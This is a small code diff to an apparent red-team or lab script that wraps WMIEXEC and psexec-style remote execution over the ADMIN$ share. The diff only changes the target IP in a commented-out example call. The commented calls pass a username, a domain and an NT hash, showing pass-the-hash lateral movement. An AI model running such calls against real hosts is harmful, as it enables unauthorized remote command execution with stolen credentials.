@@ -15,5 +15,7 @@ def wmiexec(target, username, domain, password='', nthash=None, cmd=' ', shell_t
     wmi_obj = WMIEXEC(command=cmd, username=username, password=password, domain=domain, hashes=nthash, share='ADMIN$', remoteHost=target, shell_type=shell_type)
     wmi_obj.run(addr=target, silentCommand=False)
 
-#psexec(target='192.168.56.133', username='d.garza', nthash='5a642013439f0ab8721115d3a87068db', domain='contoso.local')
+#psexec(target='192.168.116.10', username='d.garza', nthash='5a642013439f0ab8721115d3a87068db', domain='contoso.local')
 #wmiexec(target='192.168.56.133', username='d.garza', nthash='5a642013439f0ab8721115d3a87068db', domain='contoso.local')
+
+
